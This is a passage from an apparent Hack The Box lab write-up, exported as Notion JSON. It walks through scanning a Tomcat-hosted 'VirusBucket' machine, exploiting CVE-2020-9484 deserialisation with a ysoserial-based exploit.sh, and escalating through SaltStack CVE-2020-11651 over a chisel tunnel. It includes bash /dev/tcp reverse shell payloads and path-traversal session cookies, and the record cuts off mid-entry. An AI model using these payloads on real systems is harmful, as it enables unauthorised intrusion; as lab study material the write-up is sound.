{"children":[{"children":[],"uri":"https://www.notion.so/d0b55e47847b41499a180f3ad7f2601b","type":"heading","createdTime":1614683668575,"lastEditedTime":1614683640000,"title":[["Recon"]],"depth":2},{"children":[{"children":[],"uri":"https://www.notion.so/78aceff1f8654fd4bafad69a6e6b14a7","type":"text","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["$ nmap -p- 10.10.10.205 > ports.nmap",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/4d8fcf3557da4cbbae9da22e347296a2","type":"code","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["PORT     STATE SERVICE\n22/tcp   open  ssh\n8080/tcp open  http-proxy"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/7f44d36cd6444f979c357f72f30d3246","type":"bulleted_list","createdTime":1614683668575,"lastEditedTime":1614683640000,"title":[["Port scan:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/e65276625d374c12a81778a72ee78da1","type":"text","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["$ nmap -sC -sV -p 22,8080 10.10.10.205 > targeted.nmap",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/4de794ed39654447bb5f84d7fb605fae","type":"code","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n8080/tcp open  http    Apache Tomcat 9.0.27\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-title: VirusBucket\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel"]],"language":"Nix","wrap":false},{"children":[],"uri":"https://www.notion.so/74a7a1b926a742b3ab3e1a35b35abd76","type":"text","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["OpenSSH 8.2p1 Ubuntu 4, Apache Tomcat 9.0.27."]]}],"uri":"https://www.notion.so/30822672461741a68e2fa4567121acf9","type":"bulleted_list","createdTime":1614683668575,"lastEditedTime":1614683640000,"title":[["Targeted scan:"]]},{"children":[],"uri":"https://www.notion.so/bd8d1dd869cd4efcbf5ccfd6bf53a5b4","type":"heading","createdTime":1614683668575,"lastEditedTime":1614683640000,"title":[["Enumeration"]],"depth":2},{"children":[],"uri":"https://www.notion.so/e2051b6a320f499791e08f5e3138fd68","type":"text","createdTime":1614683668575,"lastEditedTime":1614683640000,"title":[["HTTP Enumeration",[["b",null]]]]},{"children":[],"uri":"https://www.notion.so/481f701595984659850f39bb23c54cf2","type":"bulleted_list","createdTime":1614683668575,"lastEditedTime":1614683640000,"title":[["A website named \"VirusBucket\" hosted on port 8080, which seems to be a malware analysis platform, currently closed to public."]]},{"children":[],"uri":"https://www.notion.so/9db9b30ae68e45cf88d8f748cf08178f","type":"bulleted_list","createdTime":1614683668576,"lastEditedTime":1614683640000,"title":[["Service in beta testing is accepting malware sample for analysis, submission page at "],["http://10.10.10.205:8080/service/",[["a","http://10.10.10.205:8080/service/"]]],["."]]},{"children":[{"children":[],"uri":"https://www.notion.so/970cab30eb3a4356a0444fc5462f669d","type":"code","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["$(\"#uploadButton\").click(function(){\n  $(\"#uploadFile\").click();\n});\n\n$(document).ready(function(){\n  ImageUpload.init();\n});\n\nvar ImageUpload = {\n  init:function() {\n    $(\"#uploadFile\").change(function(){\n        ImageUpload.readURL(this);\n    });\n  },\n  readURL:function(input) {\n    if (input.files && input.files[0]) {\n        var reader = new FileReader();\n        reader.onload = function (e) {\n\t\t/*\n          $('.header').css(\n              \"background-image\",\n              \"url(\" + e.target.result + \")\"\n            );\n          $(\".clipped\").css(\n            \"background-image\",\n            \"url(\" + e.target.result + \")\"\n          ); */\n        }\n        reader.readAsDataURL(input.files[0]);\n    }\n  },\n}\n\nasync function upload() {\n  let photo = document.getElementById(\"uploadFile\").files[0];\n  let req = new XMLHttpRequest();\n  let email = document.getElementById(\"email\").value;\n  let formData = new FormData();\n\n  formData.append(\"image\", photo);\n\n  await fetch('/upload.jsp?email=' + email , { method: \"POST\", body: formData})\n    .then(response=>response.text())\n    .then(data=>{\n\t    if(data.includes(\"successfully\")) {\n\t\t    document.getElementById(\"msg\").innerText = \"Upload successful! The report will be sent via e-mail.\";\n\t    }\n\t    else {\n\t\t    document.getElementById(\"msg\").innerText = \"File upload failed\";\n\t    }\n    })\n    .catch(function(error) {\n\t    document.getElementById(\"msg\").innerText = \"File upload failed\";\n    });\n\n}"]],"language":"JavaScript","wrap":false}],"uri":"https://www.notion.so/6299af15080f445887583090a1d2dbb7","type":"bulleted_list","createdTime":1614683668576,"lastEditedTime":1614683640000,"title":[["Scanning for files with "],["dirbuster",[["c",null]]],[", found "],["/service/script.js",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/70334c4afe2c490d832f073f913bb2d0","type":"code","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["POST /upload.jsp?email=samiko@htb.me HTTP/1.1\nHost: 10.10.10.205:8080\nContent-Length: 5680\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryMGvQ3BrqXzqkF9bp\nAccept: */*\nOrigin: http://10.10.10.205:8080\nReferer: http://10.10.10.205:8080/service/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\nCookie: JSESSIONID=67893B77AA0369EBAA79816D4FA4E316\nConnection: close\n\n------WebKitFormBoundaryMGvQ3BrqXzqkF9bp\nContent-Disposition: form-data; name=\"image\"; filename=\"reverse.php\"\nContent-Type: application/x-php\n\n<?php\n...\n?>\n\n------WebKitFormBoundaryiNLEBpn1fxkcqa6S--"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/6fcb28f3b86f4c2f9ac8a2b8caf47738","type":"bulleted_list","createdTime":1614683668576,"lastEditedTime":1614683640000,"title":[["Intercepting analyse POST request with Burp Suite:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/3a8071a0d7244ccb8e4a52696511449e","type":"code","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["Content-Disposition: form-data; name=\"image\"; filename=\"reverse.php\"\nContent-Type: application/x-php"]],"language":"Nix","wrap":false},{"children":[],"uri":"https://www.notion.so/3ea4fd24e0ef4c2e9a3e8977f68a92c9","type":"code","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["formData.append(\"image\", photo);"]],"language":"JavaScript","wrap":false}],"uri":"https://www.notion.so/bf9fbd118f6c427ea096b48f2ad183e2","type":"bulleted_list","createdTime":1614683668576,"lastEditedTime":1614683640000,"title":[["Looking at the response and "],["script.js",[["c",null]]],[", we see that the upload function is expecting an image file:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/bf8f07c98d70404c863079b29cad346a","type":"code","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["org.apache.commons.fileupload.FileUploadBase$IOFileUploadException: Processing of multipart/form-data request failed.\n  /opt/tomcat/temp/upload_ef4835ae_2996_473d_b415_5cd220815631_00000026.tmp (Permission denied)"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/ae71c6cff1974917ab8b2ce64812459f","type":"bulleted_list","createdTime":1614683668576,"lastEditedTime":1614683640000,"title":[["Upon submitting a sufficiently large image, we get a Java error:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/cb633dcf2491470aa93235db560d622a","type":"code","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["java.io.FileNotFoundException: /opt/samples/uploads (Is a directory)"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/8c25a698800d4a81afc447662cdc9c82","type":"bulleted_list","createdTime":1614683668576,"lastEditedTime":1614683640000,"title":[["Upon sending a request with the "],["filename",[["c",null]]],[" parameter as blank, we get another error:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/8a062bd9289d4ac5ad7ef3a185034fb5","type":"text","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["/opt/samples/uploads",[["c",null]]]]}],"uri":"https://www.notion.so/48b136219663484bb9dc43398dc82dae","type":"bulleted_list","createdTime":1614683668576,"lastEditedTime":1614683640000,"title":[["Path to file uploads on the remote filesystem exposed:"]]},{"children":[],"uri":"https://www.notion.so/1ee78a7ebe914fb8a0683604349c6d7a","type":"bulleted_list","createdTime":1614683668576,"lastEditedTime":1614683640000,"title":[["From these two error messages, we see that Tomcat first writes the data stream to a "],[".tmp",[["c",null]]],[" file in the "],["/opt/tomcat/temp/",[["c",null]]],[" directory under a temporary name. However, if the file upload exceeds the size limit set in "],["web.xml",[["c",null]]],[", the upload is cancelled and returns an error."]]},{"children":[],"uri":"https://www.notion.so/d55f492f2dc94f249d383aa2533f0ee0","type":"bulleted_list","createdTime":1614683668576,"lastEditedTime":1614683640000,"title":[["If the upload was successful, the file is then moved to "],["/opt/samples/uploads",[["c",null]]],[" and stored there."]]},{"children":[],"uri":"https://www.notion.so/a354e9b3c3184c3f8dc20343903bb087","type":"bulleted_list","createdTime":1614683668576,"lastEditedTime":1614683640000,"title":[["After some searching, it seems that Apache Tomcat 9.0.27 is in fact outdated, and is vulnerable to RCE by deserialisation under CVE-2020-9484."]]},{"children":[{"children":[],"uri":"https://www.notion.so/fa0a84d7f9ce47d1a0b2002ed16a3f31","type":"numbered_list","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["The "],["PersistentManager",[["c",null]]],[" is enabled and it’s using a "],["FileStore",[["c",null]]],["."]]},{"children":[],"uri":"https://www.notion.so/445260f4a2b04d12b140547ec25e080d","type":"numbered_list","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["The attacker is able to upload a file with arbitrary content, has control over the filename and knows the location where it is uploaded."]]},{"children":[],"uri":"https://www.notion.so/e2bb937d8e284fa28cb3a6478394ee3e","type":"numbered_list","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["There are gadgets in the "],["classpath",[["c",null]]],[" that can be used for a Java deserialization attack."]]}],"uri":"https://www.notion.so/f2e16504f48f4f48a452af2daa918a99","type":"bulleted_list","createdTime":1614683668576,"lastEditedTime":1614683640000,"title":[["There are a number of prerequisites for CVE-2020-9484 to be exploitable:"]]},{"children":[],"uri":"https://www.notion.so/90fc8dc523e240d29bd855df7cf7b099","type":"bulleted_list","createdTime":1614683668576,"lastEditedTime":1614683640000,"title":[["We know we can upload arbitrary files by making a POST request to "],["http://10.10.10.205/upload.jsp",[["a","http://10.10.10.205/upload.jsp"]]]]},{"children":[{"children":[],"uri":"https://www.notion.so/6eeaf931b5bc4156a5a08a849607f02e","type":"code","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["Cookie: JSESSIONID=67893B77AA0369EBAA79816D4FA4E316"]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/4d3f19fad9fa42e3a0f1f5f8770f10bf","type":"bulleted_list","createdTime":1614683668576,"lastEditedTime":1614683640000,"title":[["We can assume that there are gadgets that we can abuse, and that "],["PersistentManager",[["c",null]]],[" is enabled from the cookie:"]]},{"children":[],"uri":"https://www.notion.so/6770474b1af641079b30e8506f0ab872","type":"heading","createdTime":1614683668576,"lastEditedTime":1614683640000,"title":[["Exploitation"]],"depth":2},{"children":[],"uri":"https://www.notion.so/5a71c762500e472ba4522939a99d8cc7","type":"bulleted_list","createdTime":1614683668576,"lastEditedTime":1614683640000,"title":[["When Tomcat receives a HTTP request with a "],["JSESSIONID",[["c",null]]],[" cookie, it will ask the "],["Manager",[["c",null]]],[" to check if this session already exists."]]},{"children":[],"uri":"https://www.notion.so/bb15be916b29434ca79419bbeb731fcd","type":"bulleted_list","createdTime":1614683668576,"lastEditedTime":1614683640000,"title":[["The attacker can control the value of "],["JSESSIONID",[["c",null]]],[" sent in the request, but this value is not sanitised and relative paths are accepted."]]},{"children":[],"uri":"https://www.notion.so/ca3e753cba464db09309d37e6fc11fac","type":"bulleted_list","createdTime":1614683668576,"lastEditedTime":1614683640000,"title":[["This means we can put in something like "],["JSESSIONID=../../../../../../opt/samples/uploads/payload",[["c",null]]],[", and trick the "],["Manager",[["c",null]]],[" into deserialising arbitrary files that we uploaded."]]},{"children":[{"children":[],"uri":"https://www.notion.so/73f744e7d26b4f69affda1fdf4b9f3c6","type":"numbered_list","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["Serialise the payload with "],["ysoserial",[["c",null]]],[", and output the payload as a "],[".session",[["c",null]]],[" file."]]},{"children":[],"uri":"https://www.notion.so/7a4262b80c1b43d78c754ae0f76ccf6f","type":"numbered_list","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["Upload the "],[".session",[["c",null]]],[" file through "],["http://10.10.10.205:8080/upload.jsp",[["a","http://10.10.10.205:8080/upload.jsp"]]],["."]]},{"children":[],"uri":"https://www.notion.so/24b45b7ce96c4db1b0415f424871dc71","type":"numbered_list","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["Send a POST request with "],["JSESSIONID",[["c",null]]],[" of "],["../../../../../../opt/samples/uploads/payload",[["c",null]]],["."]]},{"children":[],"uri":"https://www.notion.so/02c4ce0bc28d4ba5ae7b8ca730542c3f","type":"numbered_list","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["Tomcat will then requests the "],["Manager",[["c",null]]],[" to check if a session with ID "],["../../../../../../opt/samples/uploads/payload",[["c",null]]],[" exists."]]},{"children":[],"uri":"https://www.notion.so/8a9c663fc7e74e6591d14c8be5e17442","type":"numbered_list","createdTime":1614683668579,"lastEditedTime":1614683640000,"title":[["It will first check if it has that session in memory, but we know that it does not."]]},{"children":[],"uri":"https://www.notion.so/5b96feddb7ff48f4b1241bc1319f625b","type":"numbered_list","createdTime":1614683668580,"lastEditedTime":1614683640000,"title":[["If the currently running "],["Manager",[["c",null]]],[" is a "],["PersistentManager",[["c",null]]],[", it will also check if a "],[".session",[["c",null]]],[" file associated to that ID is on the disk."]]},{"children":[],"uri":"https://www.notion.so/5f30a038d23b46ffb61252da247e40b2","type":"numbered_list","createdTime":1614683668580,"lastEditedTime":1614683640000,"title":[["It will check at location: "],["directory",[["c",null]]],[" + "],["sessionid",[["c",null]]],[" + "],[".session",[["c",null]]],[", which evaluates to "],["./session/../../../../../../opt/samples/uploads/payload.session",[["c",null]]],["."]]},{"children":[],"uri":"https://www.notion.so/330c2eff8e174fe2b369ebb56921241b","type":"numbered_list","createdTime":1614683668580,"lastEditedTime":1614683640000,"title":[["If the file exists, it will deserialize it and parse the session information from it, granting us arbitrary code execution."]]}],"uri":"https://www.notion.so/b5e320931d7a40bda5ab497684921c7c","type":"bulleted_list","createdTime":1614683668576,"lastEditedTime":1614683640000,"title":[["The exploitation process goes as follows:"]]},{"children":[],"uri":"https://www.notion.so/62e97af5b36a409588dbefe6ad14c9fb","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["Get "],["ysoserial.jar",[["c",null]]],[" from "],["JitPack",[["a","https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar"]]],[", this will be used for serialising our reverse shell payload."]]},{"children":[{"children":[],"uri":"https://www.notion.so/cf9726072fec4939902708e8cffaa183","type":"code","createdTime":1614683668580,"lastEditedTime":1614683640000,"title":[["#!/bin/bash\nl_ip=\"10.10.14.103\" # Local IP\nl_port=\"6969\" # Local port\nt_ip=\"10.10.10.205\" # Target IP\nt_port=\"8080\" # Target port\nu_path=\"/opt/samples/uploads\" # Upload path\n\nshell=$(echo -n \"bash -i >& /dev/tcp/$l_ip/$l_port 0>&1\" | base64)\npayload=\"bash -c {echo,$shell}|{base64,-d}|{bash,-i}\"\njava -jar /home/samiko/Desktop/oscp-prep/HTB/Common/ysoserial.jar CommonsCollections2 \"${payload}\" > reverse.session\ncurl -F 'image=@reverse.session' http://$t_ip:$t_port/upload.jsp?email=samiko@htb.me\ncurl --cookie \"JSESSIONID=../../../../../$u_path/reverse\" -L http://$t_ip:$t_port/upload.jsp?email=samiko@htb.me"]],"language":"Bash","wrap":false}],"uri":"https://www.notion.so/b62c5efc9d3645b885949d3cece61021","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["Creating "],["exploit.sh",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/dbbee5ead12a4696ac937d9f821e9464","type":"text","createdTime":1614683668581,"lastEditedTime":1614683640000,"title":[["$ nc -lvnp 6969",[["c",null]]]]}],"uri":"https://www.notion.so/8585a3e805724693b28c416f30c75d0e","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["Listen for a reverse shell with "],["nc",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/8b1c7b7fbb0440b0bdeb8157223d6c2c","type":"text","createdTime":1614683668581,"lastEditedTime":1614683640000,"title":[["$ whoami && id",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/c4371afc2b264280ad0159e3cef8bba5","type":"code","createdTime":1614683668581,"lastEditedTime":1614683640000,"title":[["tomcat\nuid=1000(tomcat) gid=1000(tomcat) groups=1000(tomcat)"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/b705066802a840629a703cf854dabb18","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["Run the exploit, and we should get a shell as tomcat:"]]},{"children":[],"uri":"https://www.notion.so/4c50b249b80b42fea6df86556fdfc15b","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["Get user flag!"]]},{"children":[],"uri":"https://www.notion.so/1bc99b0c455d4e42876f361cad9817d3","type":"heading","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["Privilege Escalation"]],"depth":2},{"children":[{"children":[],"uri":"https://www.notion.so/bd5c742b54c340138cbb613bab2a46f1","type":"text","createdTime":1614683668581,"lastEditedTime":1614683640000,"title":[["$ ip a",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/785b57bf61c0448fb1956ece0b2f0342","type":"code","createdTime":1614683668581,"lastEditedTime":1614683640000,"title":[["1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n  link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n  inet 127.0.0.1/8 scope host lo\n     valid_lft forever preferred_lft forever\n  inet6 ::1/128 scope host\n     valid_lft forever preferred_lft forever\n2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n  link/ether 00:50:56:b9:79:7b brd ff:ff:ff:ff:ff:ff\n  inet 10.10.10.205/24 brd 10.10.10.255 scope global ens160\n     valid_lft forever preferred_lft forever\n  inet6 dead:beef::250:56ff:feb9:797b/64 scope global dynamic mngtmpaddr\n     valid_lft 86306sec preferred_lft 14306sec\n  inet6 fe80::250:56ff:feb9:797b/64 scope link\n     valid_lft forever preferred_lft forever\n3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default\n  link/ether 02:42:d8:17:45:bb brd ff:ff:ff:ff:ff:ff\n  inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\n     valid_lft forever preferred_lft forever\n  inet6 fe80::42:d8ff:fe17:45bb/64 scope link\n     valid_lft forever preferred_lft forever\n4: br-e9220f64857c: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default\n  link/ether 02:42:4e:a6:3d:3a brd ff:ff:ff:ff:ff:ff\n  inet 172.18.0.1/16 brd 172.18.255.255 scope global br-e9220f64857c\n     valid_lft forever preferred_lft forever\n6: veth3687d86@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default\n  link/ether 9a:f9:53:6d:49:90 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n  inet6 fe80::98f9:53ff:fe6d:4990/64 scope link\n     valid_lft forever preferred_lft forever"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/9ad115ea26c24f30ae0dee45617ac20c","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["Checking for network interfaces:"]]},{"children":[],"uri":"https://www.notion.so/ddb354e8029d48caac9f0d7d327b3dc1","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["We see "],["docker0",[["c",null]]],[", and two other unknown connections, "],["br-e9220f64857c",[["c",null]]],[" and "],["veth3687d86@if5",[["c",null]]],[", presumably interfaces for Docker containers."]]},{"children":[{"children":[],"uri":"https://www.notion.so/36f1d8bd3c4c4fceadd01a51bf8dc352","type":"text","createdTime":1614683668581,"lastEditedTime":1614683640000,"title":[["$ netstat -tulpn",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/257a042850414fcc856934f75276cf51","type":"code","createdTime":1614683668581,"lastEditedTime":1614683640000,"title":[["Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:36823         0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:4505          0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:4506          0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -\ntcp6       0      0 :::22                   :::*                    LISTEN      -\ntcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      972/java\ntcp6       0      0 :::8080                 :::*                    LISTEN      972/java\nudp        0      0 127.0.0.53:53           0.0.0.0:*                           -"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/0cf96337b1d1459bbe9234ad01e4e135","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["Checking for listening ports:"]]},{"children":[],"uri":"https://www.notion.so/b7cc96b547e347d69cf3930b8c184722","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["We can safely ignore ports 22, 8005, and 8080. Port 22 is SSH, and 8005/8080 are running Tomcat which we have just exploited."]]},{"children":[],"uri":"https://www.notion.so/63e243523cb44830ada80f7b9fc1ef0b","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["Ports 4505, 4506 are also listening. After a quick search, we find out that the ports are used by SaltStack Salt, an infrastructure automation software. The request server port is by default set to 4506."]]},{"children":[],"uri":"https://www.notion.so/66ff6708158d4be9b7d52337d0a02beb","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["A quick search reveals two vulnerabilities within SaltStack that could lead to RCE, CVE-2020-11651 and CVE-2020-11652."]]},{"children":[],"uri":"https://www.notion.so/2438fd07ea9b4c79aa421c309638b702","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["CVE-2020-11651 allows remote user access, and CVE-2020-11652 permits arbitrary directory access."]]},{"children":[],"uri":"https://www.notion.so/f6722bcc04d14b8a92bec35368e4b208","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["SaltStack uses a master-slave model where the salt master is used to send commands and configurations to the salt minions (slaves). A single master can manage multiple minions."]]},{"children":[{"children":[],"uri":"https://www.notion.so/e9fd24a656254e7bb046e70ac3e1a4c4","type":"numbered_list","createdTime":1614683668581,"lastEditedTime":1614683640000,"title":[["_prep_auth_info()",[["b",null],["c",null]]],[" method, which returns the user token (Root Key). This allows the attackers retrieve user tokens to bypass authentication, resulting in remote command execution on both the salt master and minions."]]},{"children":[],"uri":"https://www.notion.so/899d372a78ce4324a39f2be13dcfe293","type":"numbered_list","createdTime":1614683668581,"lastEditedTime":1614683640000,"title":[["_send_pub()",[["c",null]]],[" method, which queues messages directly on the master publish server, and can be used to trigger minions to run arbitrary commands as root."]]}],"uri":"https://www.notion.so/e3e1c764b9504d0ca043ff97571ada15","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["In CVE-2020-11651, the salt master process, "],["ClearFuncs",[["c",null]]],[", does not validate method calls properly and exposes the following two methods:"]]},{"children":[],"uri":"https://www.notion.so/857aa0f91888408fa92305ba1894c49a","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["In CVE-2020-11652, the "],["get_token()",[["c",null]]],[" method of the "],["salt.tokens.localfs",[["c",null]]],[" fails to sanitize the token input parameter, which is then used as a filename, allowing insertion of traversal characters such as "],["../",[["c",null]]],[" and leading to arbitrary directory access."]]},{"children":[{"children":[],"uri":"https://www.notion.so/d831534d73484f9ebbef5a28357ee332","type":"text","createdTime":1614683668581,"lastEditedTime":1614683640000,"title":[["$ python3 rce.py",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/d3d0162019444c20bd450701f06e9a64","type":"code","createdTime":1614683668581,"lastEditedTime":1614683640000,"title":[["Traceback (most recent call last):\n    File \"rce.py\", line 16, in <module>\n      import salt\n  ModuleNotFoundError: No module named 'salt'"]],"language":"Python","wrap":false}],"uri":"https://www.notion.so/ea1bfbd34e8d4098b270eea7e3f7bdc6","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["Using a PoC created by jasperla on "],["GitHub",[["a","https://github.com/jasperla/CVE-2020-11651-poc"]]],[". Unfortunately, the exploit could not be run on remotely on the target, as the Salt module is missing and "],["pip",[["c",null]]],[" is not installed:"]]},{"children":[],"uri":"https://www.notion.so/017cf1a79017446483178bf9a35ff5c2","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["This means we must exploit the target remotely from our local machine, which we can do by using "],["chisel",[["c",null]]],[" to reverse port forward 4506."]]},{"children":[{"children":[],"uri":"https://www.notion.so/14136b893a234d0e9d92d3d0669feb66","type":"text","createdTime":1614683668581,"lastEditedTime":1614683640000,"title":[["$ cp /usr/local/bin/chisel ./www/",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/4b0d3084bfdb44e9948b66d22230fc42","type":"text","createdTime":1614683668581,"lastEditedTime":1614683640000,"title":[["$ cd ./www && updog",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/e7e6d69917674c9aa9def1fa53e5bfa5","type":"text","createdTime":1614683668581,"lastEditedTime":1614683640000,"title":[["$ curl <http://10.10.14.103:9090/chisel> -o chisel",[["c",null]]]]}],"uri":"https://www.notion.so/fab8352d79b34a708b3bf4a223d19565","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["Upload "],["chisel",[["c",null]]],[" to target:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/51b65fdc6485455399d8a66f2cf58df7","type":"text","createdTime":1614683668582,"lastEditedTime":1614683640000,"title":[["$ ./chisel server -p 1337 --reverse",[["c",null]]]]}],"uri":"https://www.notion.so/1a0e54b92d564302bc6ddaff9669472b","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["On our local machine, setup a reverse tunnelling server:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/e3f03f3b4457435d86b28f20541e0db1","type":"text","createdTime":1614683668582,"lastEditedTime":1614683640000,"title":[["$ ./chisel client 10.10.14.103:1337 R:4506:localhost:4506",[["c",null]]]]}],"uri":"https://www.notion.so/4d4f48eff9c04af18318f4cafe763d48","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["On the target machine, connect to our local server and forward port 4506 on "],["localhost",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/59116b8e25464cf4990bc8a4e8eb9f5a","type":"text","createdTime":1614683668582,"lastEditedTime":1614683640000,"title":[["$ python saltstack_rce.py --exec 'bash -c \"bash -i >& /dev/tcp/10.10.14.103/1234 0>&1\"'",[["c",null]]]]}],"uri":"https://www.notion.so/c7c542c8acc542c18a7d77c0c8801563","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["Exploit SaltStack with PoC, and spawn a reverse shell:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/7e1702b58e6e4c8489d0c2e2930afdcd","type":"text","createdTime":1614683668582,"lastEditedTime":1614683640000,"title":[["$ whoami && id && hostname",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/5cdff473fb0d4fa08210032acdff13ee","type":"code","createdTime":1614683668582,"lastEditedTime":1614683640000,"title":[["root\nuid=0(root) gid=0(root) groups=0(root)\n2d24bf61767c"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/4da29eb06dae4f848edccd2a4c0b9df5","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["Now in the SaltStack container as root:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/b069c3d1d7664bcf99e3256d4f2a0736","type":"code","createdTime":1614683668582,"lastEditedTime":1614683640000,"title":[["- Add saltstack support to auto-spawn sandbox dockers through events.\n- Integrate changes to tomcat and make the service open to public."]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/fb419f4bc3884c26b10509da30d9f6a2","type":"bulleted_list","createdTime":1614683668577,"lastEditedTime":1614683640000,"title":[["Found "],["todo.txt",[["c",null]]],[" in root home 